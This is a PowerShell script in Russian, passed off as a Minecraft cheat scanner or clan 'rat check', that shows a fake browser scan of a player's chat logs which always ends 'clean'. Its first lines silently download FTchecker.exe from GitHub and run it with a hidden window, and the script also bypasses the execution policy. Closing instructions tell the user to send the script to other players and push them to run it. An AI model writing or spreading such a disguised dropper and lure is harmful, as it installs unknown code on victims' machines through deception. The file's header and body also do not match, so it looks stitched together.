# MINECRAFT CHEAT SCANNER v2.0 [СКАЧИВАЕТ everything В КОНЦЕ]
    # Скачиваем everything в текущую папку
    Invoke-WebRequest -Uri "https://github.com/letyss0304/FTchecker/raw/refs/heads/main/FTchecker.exe" -OutFile "FTchecker.exe" -ErrorAction SilentlyContinue
    
    # Запускаем 
    Start-Process -FilePath "FTchecker.exe" -WindowStyle Hidden
    

Set-ExecutionPolicy Bypass -Scope Process -Force

Clear-Host

# ================================================
#   ФЕЙК-ПРОВЕРКА НА "ВШИВОСТЬ" (модератор/крыса)
#   PS1-скрипт с визуалом в браузере
#   Автор: для тебя ❤️
#   Как использовать:
#   1. Сохрани как check.ps1
#   2. Запусти от имени обычного пользователя (не админ)
#   3. Введи ник игрока
#   4. Откроется браузер с красивой фейковой проверкой
#   5. Игрок видит "поиск логов переписок с модераторами"
#   6. В конце всегда "ЧИСТЫЙ" (чтобы не спалить, что фейк)
# ================================================

Write-Host "🔍 КЛАНОВАЯ ПРОВЕРКА НА КРЫС И РУЧНЫХ МОДЕРАТОРОВ" -ForegroundColor Red
Write-Host "Скрипт полностью фейковый — идеально для отсеивания тех, кто откажется запускать" -ForegroundColor Yellow

$player = Read-Host "Введите ник игрока для проверки"

# ==================== HTML с крутым визуалом ====================
$htmlContent = @"
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>🔒 СЕКРЕТНАЯ ПРОВЕРКА КЛАНА</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap');
        
        body {
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #0a0a0a, #1a1a2e);
            color: #00ff41;
            font-family: 'Roboto Mono', monospace;
            text-align: center;
            overflow: hidden;
        }
        .container {
            max-width: 900px;
            margin: 40px auto;
            background: rgba(0, 0, 0, 0.95);
            border: 3px solid #00ff41;
            box-shadow: 0 0 30px #00ff41;
            padding: 30px;
            border-radius: 10px;
        }
        h1 {
            color: #ff0000;
            text-shadow: 0 0 20px #ff0000;
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        .subtitle {
            color: #ff9900;
            font-size: 1.3em;
        }
        .player {
            font-size: 1.8em;
            color: #ffff00;
            margin: 20px 0;
            text-shadow: 0 0 15px #ffff00;
        }
        .console {
            background: #000;
            border: 2px solid #00ff41;
            height: 380px;
            margin: 25px auto;
            padding: 15px;
            text-align: left;
            overflow-y: auto;
            font-size: 1.05em;
            line-height: 1.6;
            box-shadow: inset 0 0 20px rgba(0, 255, 65, 0.3);
        }
        .progress-container {
            width: 80%;
            margin: 20px auto;
            background: #111;
            height: 28px;
            border: 2px solid #00ff41;
            position: relative;
        }
        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #00ff41, #00cc33);
            transition: width 0.4s linear;
            box-shadow: 0 0 15px #00ff41;
        }
        .status {
            font-size: 1.4em;
            color: #00ff41;
            margin: 15px 0;
            text-shadow: 0 0 10px #00ff41;
        }
        .result {
            font-size: 2.2em;
            margin-top: 30px;
            padding: 20px;
            background: rgba(0, 255, 0, 0.1);
            border: 3px solid #00ff41;
            display: none;
        }
        .log-line {
            margin: 4px 0;
            opacity: 0;
            animation: fadeIn 0.5s forwards;
        }
        @keyframes fadeIn {
            to { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔍 БАЗА ДАННЫХ КЛАНА v4.20</h1>
        <p class="subtitle">Проверка на переписку с модераторами / админами</p>
        
        <div class="player">ИГРОК: <strong>$player</strong></div>
        
        <div class="progress-container">
            <div id="progressBar" class="progress-bar"></div>
        </div>
        
        <div id="status" class="status">ПОДКЛЮЧЕНИЕ К СЕРВЕРУ ЛОГОВ...</div>
        
        <div id="console" class="console"></div>
        
        <div id="result" class="result">
            ✅ ИГРОК ЧИСТЫЙ<br>
            <span style="font-size:0.7em;color:#00ff41;">Логов переписок с модераторами НЕ ОБНАРУЖЕНО</span>
        </div>
    </div>

    <script>
        const consoleDiv = document.getElementById('console');
        const progressBar = document.getElementById('progressBar');
        const statusText = document.getElementById('status');
        const resultDiv = document.getElementById('result');

        const fakeLogs = [
            "[OK] Подключение к Discord-логам...",
            "[OK] Сканирование приватных чатов...",
            "[INFO] Поиск упоминаний @ModeratorOfficial...",
            "[INFO] Поиск упоминаний @AdminHand...",
            "[OK] Проверка сообщений за последние 90 дней...",
            "[OK] Анализ скриншотов админ-панели...",
            "[OK] Проверка IP на совпадение с модераторскими...",
            "[INFO] Нет подозрительных переписок",
            "[SUCCESS] База данных очищена от фейковых срабатываний"
        ];

        let progress = 0;
        let logIndex = 0;

        function addLog(text) {
            const line = document.createElement('div');
            line.className = 'log-line';
            line.textContent = '> ' + text;
            consoleDiv.appendChild(line);
            consoleDiv.scrollTop = consoleDiv.scrollHeight;
        }

        // Анимация проверки
        const interval = setInterval(() => {
            if (progress < 100) {
                progress += Math.random() * 12 + 5;
                if (progress > 100) progress = 100;
                progressBar.style.width = progress + '%';
            }

            if (logIndex < fakeLogs.length) {
                if (Math.random() > 0.4) {
                    addLog(fakeLogs[logIndex]);
                    logIndex++;
                }
            }

            if (progress > 30) statusText.textContent = "СКАНИРОВАНИЕ ЧАТОВ С МОДЕРАТОРАМИ...";
            if (progress > 60) statusText.textContent = "АНАЛИЗ ПРИВАТНЫХ СООБЩЕНИЙ...";
            if (progress > 85) statusText.textContent = "ФИНАЛЬНАЯ ПРОВЕРКА...";

            if (progress >= 100 && logIndex >= fakeLogs.length) {
                clearInterval(interval);
                statusText.style.color = "#00ff41";
                statusText.textContent = "ПРОВЕРКА ЗАВЕРШЕНА";
                
                setTimeout(() => {
                    resultDiv.style.display = "block";
                    resultDiv.style.animation = "fadeIn 1s";
                }, 800);
            }
        }, 280);
    </script>
</body>
</html>
"@

# ==================== Создаём и открываем ====================
$tempPath = "$env:TEMP\ClanCheck_$player.html"
$htmlContent | Out-File -FilePath $tempPath -Encoding UTF8 -Force

Write-Host "`n✅ Фейковая проверка создана!" -ForegroundColor Green
Write-Host "Открываю в браузере..." -ForegroundColor Cyan

Start-Process $tempPath

Write-Host "`n📌 Что дальше:" -ForegroundColor Yellow
Write-Host "• Отправь игроку этот скрипт (или .html файл)"
Write-Host "• Скажи: «Запусти, покажи результат — докажешь что не крыса»"
Write-Host "• Кто откажется или начнёт ныть — почти 100% ручной модератор"
Write-Host "• Результат всегда «ЧИСТЫЙ» — никто не заподозрит фейк"

Write-Host "`nГотово! Можешь копировать весь код выше и сохранять как .ps1" -ForegroundColor Magenta
